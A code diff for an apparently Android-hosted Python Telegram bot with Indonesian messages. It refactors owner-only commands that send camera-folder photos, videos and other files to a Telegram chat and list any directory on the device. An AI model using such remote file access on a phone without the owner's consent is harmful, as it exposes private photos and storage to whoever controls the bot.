@@ -73,40 +73,48 @@ def kirim_daftar_galeri(message):
         bot.send_message(message.chat.id, "❌ Akses ditolak.")
 
 # 3. Ambil file galeri berdasarkan ID
+
 @bot.message_handler(commands=['getfile'])
 def get_file_by_id(message):
-    if is_owner(message):
-        try:
-            args = message.text.split()
-            if len(args) < 2:
-                bot.send_message(message.chat.id, "❗ Gunakan format: /getfile <id>")
-                return
-
-            file_id = args[1]
-            if file_id not in galeri_index:
-                bot.send_message(message.chat.id, "❗ ID file tidak ditemukan.")
-                return
-
-            filename = galeri_index[file_id]
-            filepath = os.path.join("/sdcard/DCIM/Camera", filename)
-
-            if not os.path.isfile(filepath):
-                bot.send_message(message.chat.id, "❗ File tidak ditemukan di storage.")
-                return
-
-            ext = filename.lower().split('.')[-1]
-            if ext in ['jpg', 'jpeg', 'png']:
-                with open(filepath, 'rb') as photo:
-                    bot.send_photo(message.chat.id, photo)
-            elif ext in ['mp4', 'mov']:
-                with open(filepath, 'rb') as video:
-                    bot.send_video(message.chat.id, video)
-            else:
-                bot.send_message(message.chat.id, "❗ Tipe file tidak didukung untuk dikirim.")
-        except Exception as e:
-            bot.send_message(message.chat.id, f"❌ Error: {escape_md(str(e))}", parse_mode="MarkdownV2")
-    else:
+    if not is_owner(message):
         bot.send_message(message.chat.id, "❌ Akses ditolak.")
+        return
+
+    try:
+        args = message.text.split()
+        if len(args) < 2:
+            bot.send_message(message.chat.id, "❗ Gunakan format: /getfile <file_id>")
+            return
+
+        file_id = args[1]
+
+        if file_id not in galeri_index:
+            bot.send_message(message.chat.id, "❗ ID file tidak ditemukan.")
+            return
+
+        filename = galeri_index[file_id]
+        filepath = os.path.join("/sdcard/DCIM/Camera", filename)
+
+        if not os.path.isfile(filepath):
+            bot.send_message(message.chat.id, "❗ File tidak ditemukan.")
+            return
+
+        ext = filename.lower().split('.')[-1]
+
+        if ext in ['jpg', 'jpeg', 'png']:
+            with open(filepath, 'rb') as photo:
+                bot.send_photo(message.chat.id, photo, timeout=60)
+
+        elif ext in ['mp4', 'mov']:
+            with open(filepath, 'rb') as video:
+                bot.send_video(message.chat.id, video, timeout=60)
+
+        else:
+            with open(filepath, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, timeout=60)
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"❌ Error: `{e}`", parse_mode="Markdown")
 
 # 4. Putar Musik MP3 di folder Music
 @bot.message_handler(commands=['playmusik'])
@@ -143,7 +151,6 @@ def kunci_file(message):
 # 6. Ls Daftar Penyimpanan
 @bot.message_handler(commands=['ls'])
 def ls_command(message):
-    # Cek owner kalau perlu, contoh:
     if message.chat.id != OWNER_ID:
         bot.send_message(message.chat.id, "❌ Akses ditolak.")
         return
@@ -156,7 +163,6 @@ def ls_command(message):
 
     path = parts[1]
 
-    # Cek folder ada atau nggak
     if not os.path.exists(path):
         bot.send_message(message.chat.id, f"❗ Folder tidak ditemukan: {path}")
         return
@@ -171,7 +177,7 @@ def ls_command(message):
             bot.send_message(message.chat.id, f"📁 Folder kosong: {path}")
             return
 
-        hasil = f"Isi folder `{path}`:\n"
+        hasil = f"📂 Isi folder {path}:\n"
         for f in files:
             full_path = os.path.join(path, f)
             if os.path.isdir(full_path):
@@ -179,9 +185,10 @@ def ls_command(message):
             else:
                 hasil += f"📄 {f}\n"
 
-        bot.send_message(message.chat.id, hasil, parse_mode='Markdown')
+        # Kirim tanpa parse_mode
+        bot.send_message(message.chat.id, hasil)
     except Exception as e:
-        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
+        bot.send_message(message.chat.id, f"❌ Error: {e}")
 #Kunci Folder
 @bot.message_handler(commands=['kuncifolder'])
 def kunci_folder(message):
